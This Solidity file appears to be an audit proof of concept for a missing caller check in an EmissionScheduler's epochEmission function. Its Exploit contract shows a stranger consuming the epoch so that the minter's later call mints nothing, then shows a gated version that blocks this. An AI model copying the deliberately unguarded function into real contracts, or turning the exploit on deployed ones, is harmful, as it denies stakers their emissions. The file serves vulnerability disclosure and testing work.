// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Hyperstable EmissionScheduler.epochEmission (0x52, 55693).
   Cheatcode-free reduction. epochEmission writes lastEpoch with no caller
   check. A stranger consumes the epoch. The minter's later call returns
   (0, 0, 0) and 200 tokens are not minted. onlyMinter keeps the 200. */

contract EmitToken {
    string public name = "Emission";
    string public symbol = "EMIT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract WipedToken {
    string public name = "Wiped emission";
    string public symbol = "WIPED";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Holder {}

contract EmissionScheduler {
    uint256 public constant WEEK = 7 days;
    uint256 public constant EMISSION_PRECISION = 10000;
    uint256 public lastEpoch;
    uint256 public lastEpochEmission;
    address public minter;
    bool public immutable gated;

    constructor(address m, bool gate) {
        minter = m;
        gated = gate;
        lastEpoch = type(uint256).max;
    }

    function _currentEpoch() public view returns (uint256) {
        return block.timestamp / WEEK;
    }

    function epochEmission(uint256 _pegSupply, uint256 _veSupply) external returns (uint256, uint256, uint256) {
        if (gated) {
            require(msg.sender == minter, "only minter");
        }
        uint256 currentEpoch = _currentEpoch();
        if (currentEpoch == lastEpoch) {
            return (0, 0, 0);
        }
        // @> VULN: any caller writes lastEpoch, so the minter's later call returns zero
        lastEpoch = currentEpoch;
        uint256 toEmit = (_pegSupply - _veSupply) * 2 / EMISSION_PRECISION;
        lastEpochEmission = toEmit;
        uint256 rebase = toEmit / 2;
        uint256 teamEmission = toEmit / 4;
        return (toEmit, rebase, teamEmission);
    }
}

contract Minter {
    function pull(EmissionScheduler s, EmitToken t, address to, uint256 peg, uint256 ve)
        external
        returns (uint256 minted)
    {
        (uint256 toEmit,,) = s.epochEmission(peg, ve);
        if (toEmit > 0) {
            t.mint(to, toEmit);
        }
        minted = toEmit;
    }
}

contract Exploit {
    uint256 public constant PEG = 1_000_000 ether;
    uint256 public constant OWED = 200 ether;

    EmitToken public emitToken;
    WipedToken public wiped;
    Minter public minter;
    EmissionScheduler public openSched;
    EmissionScheduler public gatedSched;
    Holder public stakers;
    Holder public stakersFixed;
    uint256 public sneaky;
    uint256 public wipedMint;
    uint256 public kept;
    bool public blocked;

    constructor() {
        emitToken = new EmitToken();
        wiped = new WipedToken();
        minter = new Minter();
        openSched = new EmissionScheduler(address(minter), false);
        gatedSched = new EmissionScheduler(address(minter), true);
        stakers = new Holder();
        stakersFixed = new Holder();
    }

    function run() external {
        (sneaky,,) = openSched.epochEmission(PEG, 0);
        require(sneaky == OWED, "preview");
        require(emitToken.balanceOf(address(stakers)) == 0, "not minted");
        wipedMint = minter.pull(openSched, emitToken, address(stakers), PEG, 0);
        require(wipedMint == 0, "second call");
        require(emitToken.balanceOf(address(stakers)) == 0, "wiped");
        wiped.mint(address(this), sneaky);
        try gatedSched.epochEmission(PEG, 0) returns (uint256, uint256, uint256) {
            blocked = false;
        } catch {
            blocked = true;
        }
        require(blocked, "stranger blocked");
        kept = minter.pull(gatedSched, emitToken, address(stakersFixed), PEG, 0);
        require(kept == OWED, "control");
        require(emitToken.balanceOf(address(stakersFixed)) == OWED, "stakers paid");
        require(wiped.balanceOf(address(this)) == OWED, "recorded");
    }
}
